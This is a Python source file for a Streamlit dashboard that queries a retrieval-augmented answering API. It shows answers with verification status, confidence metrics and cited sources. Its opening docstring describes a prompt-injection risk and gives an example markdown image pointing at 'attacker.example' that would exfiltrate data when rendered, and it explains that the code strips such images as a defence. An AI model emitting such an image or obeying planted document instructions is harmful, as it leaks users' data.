"""HyRAG query dashboard (Streamlit). Run:  HYRAG_API_URL=http://localhost:8000 streamlit run dashboard/app.py

A thin client of the HTTP API (dashboard/client.py): it never imports `hyrag`, so it runs in its own container.

Speed, by design (measured in docs/phase5.md):
- the question is in a form: typing never reruns the page, only pressing Ask does;
- answers live in session_state: every later rerun redraws from memory and never calls the API again;
- expanding a passage or clicking a citation happens in the browser (no rerun at all);
- the side panel's calls are cached; "compare with dense-only" sends both requests in parallel.

Safety: answer text comes from a model, and a planted instruction in a document could make it emit an image
("![](https://attacker.example/?q=...)") that the browser would fetch on render, leaking data. Model text is
rendered with images removed and external links shown as plain text; raw HTML is never rendered.
"""
import os
import time
from concurrent.futures import ThreadPoolExecutor

import streamlit as st

from client import ApiError, HyragClient
from safety import safe_markdown

API_URL = os.environ.get("HYRAG_API_URL", "http://localhost:8000")
API_KEY = os.environ.get("HYRAG_API_KEY", "")
MAX_QUESTION_CHARS = 2000

STATUS_TEXT = {
    "answered": "Answered from the documents",
    "partial": "Partly answered: the documents don't cover everything asked",
    "unverified": "Not shown: the answer couldn't be verified against its sources",
    "unchecked": "Answer not checked against its sources",
    "not_found": "Not found in the documents",
    "error": "The service couldn't answer",
}

@st.cache_resource(on_release=lambda client: client.close())  # close its connections when dropped
def get_client() -> HyragClient:
    return HyragClient(API_URL, API_KEY)


@st.cache_data(ttl=30, show_spinner=False)
def api_ready() -> dict:
    try:
        return get_client().ready()
    except ApiError as e:
        return {"ready": False, "problems": [str(e)], "chunks": 0}


@st.cache_data(ttl=60, show_spinner=False)
def api_documents(collection: str | None = None) -> dict | None:
    try:
        return get_client().documents(collection=collection)
    except ApiError:
        return None


@st.cache_data(ttl=60, show_spinner=False)
def api_collections() -> list[dict]:
    try:
        return [c for c in get_client().collections() if c["documents"]]
    except ApiError:
        return []


COLLECTION_LABELS = {"posthog": "PostHog (real company handbook)",
                     "demo": "Demo set (fictional Nimbus + NIST, Kubernetes, PostgreSQL, GitLab)"}
PREFERRED_COLLECTION = "posthog"


def ask_both(question: str, compare: bool, collection: str | None) -> dict:
    """{mode: AskResult | ApiError}. With compare, hybrid and dense-only run in parallel (one wait, not two)."""
    modes = ["hybrid", "dense"] if compare else ["hybrid"]

    def one(mode):
        try:
            return get_client().ask(question, mode, collection)
        except ApiError as e:
            return e

    with ThreadPoolExecutor(max_workers=len(modes)) as pool:
        return dict(zip(modes, pool.map(one, modes)))


# ----- rendering one answer (from memory: no API calls below this line) -----

def render_result(result, mode: str) -> None:
    prefix = f"{mode}-"
    if isinstance(result, ApiError):
        st.error(str(result))
        return
    body = result.body
    status = body["status"]
    headline = STATUS_TEXT.get(status, status)
    banner = {"answered": st.success, "partial": st.warning, "unverified": st.error, "unchecked": st.warning,
              "not_found": st.info, "error": st.error}.get(status, st.info)
    banner(f"**{headline}**" + (f"  \n{body['message']}" if body.get("message") else ""))

    if body.get("answer"):
        st.markdown(safe_markdown(body["answer"], prefix))
    for part in body.get("not_covered") or []:
        st.markdown(f"- *Not covered by the documents:* {part}")
    if status in ("unverified", "unchecked") and body.get("verified_claims"):
        with st.expander("Sentences that did pass verification"):
            for claim in body["verified_claims"]:
                st.markdown(f"- {safe_markdown(claim, prefix)}")
    if body.get("flagged_claims") and status in ("answered", "partial", "unchecked"):
        with st.expander(f"{len(body['flagged_claims'])} sentence(s) not fully verified"):
            for claim in body["flagged_claims"]:
                st.markdown(f"- {safe_markdown(claim, prefix)}")

    render_confidence(body)

    texts = {(p["source"], p["section"]): p["text"] for p in body.get("retrieved") or []}
    if body.get("sources"):
        st.markdown("#### Sources")
        for s in body["sources"]:
            st.subheader(f"[{s['n']}] {s['source']}", anchor=f"{prefix}source-{s['n']}")
            where = s["section"] + (f" · page {s['page']}" if s.get("page") else "")
            st.caption(where)
            text = texts.get((s["source"], s["section"]))
            if text:
                with st.expander("Show the cited passage"):
                    st.text(text)
    for c in body.get("closest") or []:
        st.caption(f"Closest: {c['source']} › {c['section'][-80:]} (relevance {c['relevance']})")

    render_retrieved(body)
    notes = []
    if body.get("search_queries"):
        notes.append("searched as: " + " | ".join(body["search_queries"]))
    if body.get("degraded"):
        notes.append("degraded: " + ", ".join(body["degraded"]))
    usage = body.get("usage") or {}
    tokens = sum(v for k, v in usage.items() if k.endswith("tokens"))
    notes.append(f"{'cached' if body.get('cached') else f'{tokens:,} tokens'} · API {result.seconds:.1f} s · "
                 f"request {body.get('request_id', '')}")
    st.caption("  \n".join(notes))


def render_confidence(body: dict) -> None:
    c = body.get("confidence")
    if not c or body["status"] == "not_found":
        return
    cols = st.columns(4)
    cols[0].metric("Confidence", f"{c['score']:.2f}", c["level"], delta_color="off")
    cols[1].metric("Retrieval", f"{c['retrieval']:.2f}")
    cols[2].metric("Citations verified", f"{c['citations']:.2f}")
    cols[3].metric("Completeness", f"{c['completeness']:.2f}")
    if c.get("flags"):
        st.caption("Capped by: " + ", ".join(c["flags"]))


def render_retrieved(body: dict) -> None:
    passages = body.get("retrieved") or []
    if not passages:
        return
    with st.expander(f"Retrieved passages ({len(passages)}), ranked by relevance"):
        st.dataframe(
            [{"#": i, "document": p["source"], "section": p["section"][-70:], "relevance": p["relevance"],
              "reranker": p["rerank_score"], "meaning rank": p["dense_rank"], "keyword rank": p["sparse_rank"]}
             for i, p in enumerate(passages, 1)],
            hide_index=True, width="stretch")
        for i, p in enumerate(passages, 1):
            st.markdown(f"**{i}. {p['source']}** — {p['section'][-90:]}")
            st.text(p["text"][:1500])


# ----- page -----

def main() -> None:
    t_page = time.perf_counter()
    st.set_page_config(page_title="HyRAG", page_icon="🔎", layout="wide")
    st.title("HyRAG")
    st.caption("Answers from your documents, with every citation checked.")

    with st.sidebar:
        health = api_ready()
        if health.get("ready"):
            st.success(f"API ready · {health.get('chunks', 0):,} chunks indexed")
        else:
            st.error("API not ready")
            for problem in health.get("problems", []):
                st.caption(problem)
        # Whose documents to answer from: one company at a time, never a mix of their policies.
        names = [c["name"] for c in api_collections()]
        collection = None
        if names:
            default = names.index(PREFERRED_COLLECTION) if PREFERRED_COLLECTION in names else 0
            collection = st.selectbox("Company documents", names, index=default,
                                      format_func=lambda n: COLLECTION_LABELS.get(n, n),
                                      help="Answers come only from the chosen company's documents.")
        docs = api_documents(collection)
        if docs:
            with st.expander(f"{docs['total']} documents"):
                for d in docs["documents"]:
                    st.caption(f"{d['source']} · {d['chunks']} chunks")
        if st.button("Refresh status"):
            api_ready.clear()
            api_documents.clear()
            api_collections.clear()
            st.rerun()
        st.caption(f"API: {API_URL}")

    with st.form("ask"):
        question = st.text_area("Question", max_chars=MAX_QUESTION_CHARS, height=90,
                                placeholder="e.g. How do I fix ERR_TUNNEL_4012?")
        compare = st.checkbox("Compare with dense-only retrieval", help="Runs the same question with meaning "
                              "search alone, side by side. Uses about twice the API budget.")
        submitted = st.form_submit_button("Ask", type="primary")

    if submitted:
        if not question.strip():
            st.warning("Type a question first.")
        else:
            t0 = time.perf_counter()
            with st.spinner("Searching the documents and checking the answer…"):
                st.session_state["results"] = ask_both(question.strip(), compare, collection)
            st.session_state["question"] = question.strip()
            st.session_state["collection"] = collection
            st.session_state["wait_seconds"] = time.perf_counter() - t0

    results = st.session_state.get("results")
    if results:
        st.markdown(f"### {st.session_state['question']}")
        if st.session_state.get("collection"):
            label = COLLECTION_LABELS.get(st.session_state["collection"], st.session_state["collection"])
            st.caption(f"Answered from: {label}")
        if len(results) == 2:
            left, right = st.columns(2)
            with left:
                st.markdown("**Hybrid** (meaning + keyword + reranker)")
                render_result(results["hybrid"], "hybrid")
            with right:
                st.markdown("**Dense only** (meaning search alone)")
                render_result(results["dense"], "dense")
        else:
            render_result(results["hybrid"], "hybrid")

    with st.expander("Diagnostics"):
        waited = st.session_state.get("wait_seconds", 0.0) if submitted else 0.0
        st.caption(f"Page drawn in {(time.perf_counter() - t_page - waited) * 1000:.0f} ms (excluding the answer wait)"
                   + (f"; last answer took {st.session_state['wait_seconds']:.1f} s end to end"
                      if submitted and "wait_seconds" in st.session_state else ""))


main()
